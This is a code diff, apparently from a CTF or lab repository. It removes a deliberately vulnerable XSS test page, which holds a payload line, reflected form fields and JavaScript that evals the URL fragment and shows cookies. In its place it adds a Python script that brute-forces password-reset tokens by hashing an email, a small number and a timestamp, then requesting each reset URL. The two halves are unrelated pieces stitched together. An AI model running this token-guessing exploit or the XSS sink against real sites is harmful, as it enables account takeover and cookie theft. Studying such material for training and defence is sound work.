@@ -1,99 +1,23 @@
-<<https:xx.is/onfocus=1?import(tagName):1+AutoFocus+ContentEditable>>
-<!DOCTYPE html>
-<head>
-<!-- XSS in 11 URL parameters (a, b1, b2, b3, b4, c1, c2, c3, c4, c5 and c6) + URL itself -->
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>XSS</title>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script> 
-</head>
-<body>
-<h1>XSS Test</h1>
-<!-- Simple HTMLi -->
-Hello, aaaaa!
-<br>
-<br>
-<br>
-Find user profile providing one or more below: 
-<!-- URL Reflection -->
-<form action="/xss.php" method="POST">
-<br>
-User
-<br>
-<!-- Inline HTMLi (Double Quotes) -->
-<input type="text" name="b1" value="">
-<br>
-<br>
-Email
-<br>
-<!-- Inline HTMLi (Single Quotes) -->
-<input type="text" name="b2" value=''>
-<br>
-<br>
-Name
-<br>
-<!-- Inline HTMLi - No Tag Breaking (Double Quotes) -->
-<input type="text" name="b3" value="">
-<br>
-<br>
-Group
-<br>
-<!-- Inline HTMLi - No Tag Breaking (Single Quotes) -->
-<input type="text" name="b4" value=''>
-<br>
-<br>
-<input type="submit" id="i" value="Find">
-</form>
-<script>
-	// HTMLi in Js Block (Single Quotes)
-	var c1 = 'value1';
+from hashlib import md5
+from urllib import parse
+from requests import get
+import time
 
-	// HTMLi in Js Block (Double Quotes)
-	var c2 = "value2";
+email = "61qwfZ@secure-chat.co.uk".upper()[::-1]
+timestamp = str(int(time.time()))  # You can adjust the time here if needed
 
-	// Simple Js Injection (Single Quotes)
-	var c3 = 'value3';
+baseurl = "http://1/forgot.php?resetID="
+urls = []
 
-	// Simple Js Injection (Double Quotes)
-	var c4 = "value4";
+for i in range(0, 99):  # Loop through the possible random number (0 to 99)
+    key = email + str(i) + timestamp
+    hash = md5(key.encode('utf-8')).hexdigest()
+    encodedhash = parse.quote(hash)
+    urls.append(baseurl + encodedhash)
 
-	// Escaped Js Injection (Single Quotes)
-	var c5 = 'value5';
-
-	// Escaped Js Injection (Double Quotes)
-	var c6 = "value6";
-
-</script>
-<script src=/x.js></script>
-</body>
-<footer>
-<br>
-<br>
-</footer>
-</html>
-
-if (document.location.hash) {
-   var frag = document.location.hash.match(/[^#][^#]*/)[0];
-}
-
-if (frag) {
-
-  try {
-
-    eval(frag);
-
-  } catch(e) {
-
-    alert("URL fragment (#) contains invalid JS code, try again!");
-  }
-
-} else {
-
-  alert('Context Domain: '+document.domain+'\n\nReadable Cookies: \n'+document.cookie);
-
-}
-
-
-
-
-
-
+for url in urls:
+    r = get(url)
+    if "Valid" in r.text:  # Modify this based on the response from the server
+        print(f"Valid URL: {url}")
+        print(r.text)
+        break
